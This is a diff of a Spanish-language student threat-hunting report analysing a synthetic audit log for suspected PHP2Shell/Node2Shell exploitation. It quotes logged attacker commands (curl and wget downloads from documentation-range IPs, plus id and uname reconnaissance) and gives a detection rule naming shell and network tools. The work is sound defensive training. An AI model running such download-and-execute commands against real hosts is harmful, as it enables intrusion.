@@ -3,6 +3,10 @@
 **Integrantes:** Lorenzo Bellomo (análisis), Agustin Ignacio Kloster (revisión, 30/10) · **Fecha:** jueves 29/10/2026
 
 Fuente: `laboratorio/logs/audit.log` (21 líneas, 2026-10-27 09:40–09:49 UTC).
+**Alcance de la revisión local (01/11/2026):** análisis documental del log sintético
+y de las capturas existentes; no se levantó el laboratorio ni se ejecutaron las
+instrucciones que aparecen en el log. Sus hosts y PIDs no identifican los
+contenedores del taller. Se preservan las autorías anteriores.
 Filtro inicial con `./scripts/detectar.sh`
 ([`capturas/02-detectar.txt`](capturas/02-detectar.txt)), que busca padres
 `apache2|php-fpm|node|python` con hijos `sh|bash|curl|wget|nc`. Después se leyó el log
@@ -13,9 +17,10 @@ completo para ver la cadena de cada caso y las líneas que el filtro no cubre.
 ## 1. Hipótesis de caza
 
 Si PHP2Shell o Node2Shell se explotaron, en web01 (PHP), api01 (Node) o svc01 (Python)
-vamos a ver al **proceso del servicio** (`apache2`, `node`, `python`) como **padre** de
+podríamos observar al **proceso del servicio** (`apache2`, `node`, `python`) como **padre** de
 un **shell o descargador** (`sh`, `bash`, `curl`, `wget`, `nc`), a partir del 17/10
-(primer intento visto) y sobre todo después del 21/10, con argumentos de
+(inicio de búsqueda propuesto por la cronología de la consigna, no por este log),
+y sobre todo después del 21/10, con argumentos de
 reconocimiento (`id`, `whoami`, `uname`) o URLs a IPs externas.
 
 ---
@@ -24,22 +29,26 @@ reconocimiento (`id`, `whoami`, `uname`) o URLs a IPs externas.
 
 | Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
 |---|---|---|---|---|
-| 2026-10-27T09:42:17Z (pid 903) y 09:42:18Z (pid 904) | web01 | `apache2` (812) → `sh -c id` → `id` | **Sí** | Un worker de Apache con mod_php no lanza shells. `id` es el primer comando que corre un atacante para saber con qué usuario ejecuta. Coincide con PHP2Shell en mod_php |
-| 2026-10-27T09:43:03Z (pid 601) y 09:43:04Z (pid 602) | api01 | `node` (501) → `sh -c curl http://198.51.100.7/x` → `curl` | **Sí** | `server.js` no usa `child_process`: no hay motivo legítimo para que `node` cree un shell. Descarga un archivo (`/x`) desde una IP externa. Coincide con Node2Shell |
-| 2026-10-27T09:44:22Z (pid 906) | web01 | `apache2` (812) → `wget http://198.51.100.9/a` | **Sí** | Segunda acción en web01, ahora descarga directa sin shell intermedio, desde otra IP del mismo rango |
-| 2026-10-27T09:45:10Z (pid 704) y 09:45:11Z (pid 705) | svc01 | `python` (701) → `sh -c uname -a` → `uname` | **Sí** | Reconocimiento del sistema en el servicio **interno**, que no recibe tráfico de Internet. Sugiere que el atacante ya estaba adentro y se movió lateralmente |
+| 2026-10-27T09:42:17Z (pid 903) y 09:42:18Z (pid 904) | web01 | `apache2` (812) → `sh -c id` → `id` | **Sí** | Shell de reconocimiento inesperado en el escenario. El padre registrado es 812: no se puede atribuir a un worker ni a PHP2Shell solo con este evento |
+| 2026-10-27T09:43:03Z (pid 601) y 09:43:04Z (pid 602) | api01 | `node` (501) → `sh -c curl http://198.51.100.7/x` → `curl` | **Sí** | `server.js` no usa `child_process`: no hay motivo legítimo para que `node` cree un shell. Intenta solicitar `/x` a una IP del rango de documentación; no confirma descarga exitosa ni explotación de Node2Shell |
+| 2026-10-27T09:44:22Z (pid 906) | web01 | `apache2` (812) → `wget http://198.51.100.9/a` | **Sí** | Intento de descarga sin shell intermedio registrado, dirigido a otra IP de documentación; resultado desconocido |
+| 2026-10-27T09:45:10Z (pid 704) y 09:45:11Z (pid 705) | svc01 | `python` (701) → `sh -c uname -a` → `uname` | **Sí** | Reconocimiento del sistema en el servicio **interno**, que no recibe tráfico de Internet. Motiva investigar acceso interno; no prueba movimiento lateral sin conexiones o trazas correlacionadas |
 | 09:42:40Z (1002), 09:44:10Z (1003), 09:49:00Z (1004) | db01 | `sshd` (1001) → `-bash` | Indeterminado | Sesiones SSH interactivas. Pueden ser de un administrador, pero ocurren dentro de la ventana del ataque y db01 no figura en el inventario |
 | 09:41:12Z, 09:45:00Z, 09:47:00Z | api01 | `node` (501) → `node server.js` | Baja, a confirmar | Mismo binario y mismos argumentos que el servicio: compatible con un supervisor que reinicia la app. Pero rodean al `curl` de 09:43:03 (ver 2.2) |
 | 09:41:30Z, 09:43:40Z | svc01 | `python` (701) → `python app.py` | Baja, a confirmar | Igual que el caso anterior; el de 09:43:40 precede en 90 s al `uname` (ver 2.2) |
 | 09:40:01Z … 09:48:00Z | web01 | `apache2` (812) → `apache2 -k start` | No | Comportamiento normal: el master de Apache crea workers |
 
-**¿Hay compromiso?** **Sí** en web01, api01 y svc01, con **alcance indeterminado**.
+**¿Hay compromiso?** En el escenario sintético, las señales justifican tratar
+web01, api01 y svc01 como un **incidente presunto de alta prioridad**, con alcance
+indeterminado. Los eventos prueban lo representado en el archivo, no una intrusión
+en los contenedores del grupo. En un caso real se corroborarían integridad del
+registro, autorización de las acciones y contexto antes de confirmar el incidente.
 
 - Lo que lo sostiene: tres servicios distintos ejecutan comandos que su código nunca
-  ejecuta, en una ventana de 3 minutos (09:42:17–09:45:11), con una secuencia típica
-  de post-explotación automatizada: identidad (`id`) → descarga (`curl`) → descarga
-  (`wget`) → reconocimiento (`uname`). Las dos IPs externas son del mismo rango
-  (198.51.100.0/24).
+  ejecuta, en una ventana de 3 minutos (09:42:17–09:45:11), con una secuencia compatible
+  con reconocimiento e intentos de descarga. Eso no demuestra automatización, un
+  mismo actor ni relación causal entre hosts. Las dos IPs pertenecen al rango de
+  documentación 198.51.100.0/24: no son indicadores reales para bloquear fuera del ejercicio.
 - Lo que no sabemos: si las descargas tuvieron éxito, qué se ejecutó después, si hubo
   persistencia, ni quién abrió las sesiones de db01. Con estas líneas no se puede
   confirmar el vector exacto (PHP2Shell, Node2Shell u otro), solo que los procesos de
@@ -58,41 +67,30 @@ instancias del servicio**:
 | api01 | 501 | las instancias `node server.js` (600, 603, 604) | `sh -c curl …` |
 | svc01 | 701 | las instancias `python app.py` (702, 703) | `sh -c uname -a` |
 
-Con mod_php, el código PHP corre en los **workers**. Un shell disparado por PHP2Shell
-debería colgar de un worker (900–908), no del master 812. Hay dos lecturas:
+El árbol sintético atribuye los hijos al PID principal de cada servicio, pero
+no registra UID ni permite asociar esos PIDs con los contenedores reales. Aunque
+las capturas del taller muestren un master de Apache root y workers `www-data`,
+no se puede trasladar esa identidad al PID 812 del archivo. El shell no demuestra
+por sí solo ejecución como root ni un vector específico.
 
-- El log simplifica el árbol y atribuye todo al proceso principal (es sintético).
-- La ejecución ocurrió en el **master** de Apache. En el lab, el master corre como
-  **root** ([`capturas/02-detectar.txt`](capturas/02-detectar.txt)); los workers,
-  como `www-data`. Si el log es fiel, el impacto en web01 es mayor que el que
-  asumimos.
+Para resolverlo en un incidente real se necesitarían eventos con UID/EUID, ruta
+del ejecutable, identidad de host/contenedor y ascendencia, correlacionados con los
+logs de acceso. La regla de la sección 4 solo cubre el padre directo.
 
-Sin UID en el log (sección 5) no se puede decidir entre las dos. Para la regla de la
-sección 4 deja una lección: conviene evaluar la **ascendencia** del proceso (algún
-ancestro `node`), no solo el padre directo, porque el árbol real puede tener
-intermediarios.
+### 2.2. Posibles reinicios cerca de los hallazgos
 
-### 2.2. Reinicios cerca de los hallazgos
+El log muestra nuevas ejecuciones de `node server.js`, `python app.py` y Apache,
+no la terminación de instancias anteriores. Por eso se las considera **posibles
+reinicios o creación de procesos**, no crashes confirmados.
 
-Los relanzamientos de `node server.js` y `python app.py` los marcamos de baja
-prioridad, pero merecen una segunda lectura. Node2Shell es una escritura fuera de
-rango y PHP2Shell parte de un OOM o error fatal. Un **intento fallido** de cualquiera
-de los dos típicamente **tira el proceso** y el supervisor lo relanza.
+En svc01 la ejecución de 09:43:40 precede al `uname` en 90 segundos; en api01 el
+`curl` de 09:43:03 queda entre ejecuciones de 09:41:12 y 09:45:00. La proximidad
+justifica correlación, pero no atribución a una explotación. También puede existir
+reciclado programado o administración legítima.
 
-- svc01: reinicio a las 09:43:40, `uname -a` a las 09:45:10 (90 s después).
-- api01: el `curl` de 09:43:03 queda entre los reinicios de 09:41:12 y 09:45:00.
-
-Hay una explicación alternativa: la cadencia es casi exacta (api01 a las 09:45:00 y
-09:47:00; workers de web01 a las 09:42:01, 09:44:00, 09:46:00 y 09:48:00) y se parece
-más a un reciclado programado que a crashes. El log no trae lo necesario para
-distinguirlas: el **código de salida o la señal** con que terminó la instancia
-anterior (SIGSEGV/SIGABRT frente a salida limpia), los eventos de OOM-kill del kernel
-y los logs de la app.
-
-**Mejora de detección:** alertar por reinicios de `node`, `python` o de workers de
-Apache que terminen por señal de crash. Cubre en parte el falso negativo "payload en
-memoria" de la sección 4: el intento exitoso puede no crear procesos, pero los
-fallidos suelen dejar rastro.
+**Mejora propuesta:** incorporar códigos de salida, señales, eventos OOM, logs de
+aplicación e identidad de instancia. Alertar por un aumento de terminaciones
+anómalas respecto de la línea base; un crash aislado no demuestra un ataque.
 
 ---
 
@@ -128,11 +126,25 @@ de la API, con el nombre del proceso padre y del hijo, como los de `audit.log`.
 host = api01
 AND ppid_comm = node
 AND comm IN (sh, bash, dash, ash, curl, wget, nc, ncat, python, perl)
-→ severidad crítica: alerta inmediata + aislar el contenedor + preservar evidencia
+→ alerta de alta prioridad: validar contexto + preservar evidencia + decidir contención
 ```
 
-Sobre `audit.log` es el filtro de `detectar.sh` restringido a Node; dispara con la
-línea de 2026-10-27T09:43:03Z (`node` → `sh -c curl http://198.51.100.7/x`).
+La condición es una propuesta, no una regla desplegada. El contraste estático con
+`audit.log` selecciona la **línea 9**, de 2026-10-27T09:43:03Z (`node` → `sh`).
+La línea 10 (`sh` → `curl`) no coincide por padre directo. La lista propuesta
+amplía la de `detectar.sh`; no son reglas idénticas.
+
+Reproducción de solo lectura, desde la raíz del repositorio:
+
+```bash
+awk '$2=="host=api01" && $4=="ppid_comm=node" && $6 ~ /^comm=(sh|bash|dash|ash|curl|wget|nc|ncat|python|perl)$/ {print NR ":" $0}' laboratorio/logs/audit.log
+```
+
+Resultado del contraste sobre la copia del log: una coincidencia, línea 9. No se
+interpretan ni ejecutan sus argumentos. Esto comprueba selección sobre un fixture,
+no captura real de `execve`, entrega de alertas ni aislamiento automático. Antes de
+desplegar una respuesta automática se requieren pruebas de falsos positivos,
+aprobación del responsable y un procedimiento de recuperación.
 
 **Por qué sin excepciones:** `server.js` solo responde JSON y descomprime Brotli; no
 usa `child_process`. Cualquier hijo distinto de `node server.js` es anómalo. Si en
@@ -175,3 +187,10 @@ ruta y argumentos, no por nombre.
 - **Hosts sin contexto:** db01 aparece en el log pero no en nuestro inventario.
 - **Log sintético:** es un ejercicio; las IPs son de un rango de documentación y los
   PIDs no corresponden al laboratorio que levantamos.
+
+**Criterio de cierre:** una descarga fallida, un healthcheck correcto o la ausencia
+de coincidencias no descartan ejecución previa ni acceso a datos. Para cerrar se
+requieren cobertura suficiente, explicación de las acciones, búsqueda de
+persistencia y correlación con red, archivos y autenticación. Si esa evidencia no
+existe, el resultado es indeterminado. La falta de registros entre el 17/10 y el
+27/10 es una limitación de cobertura, no prueba de ausencia de actividad.
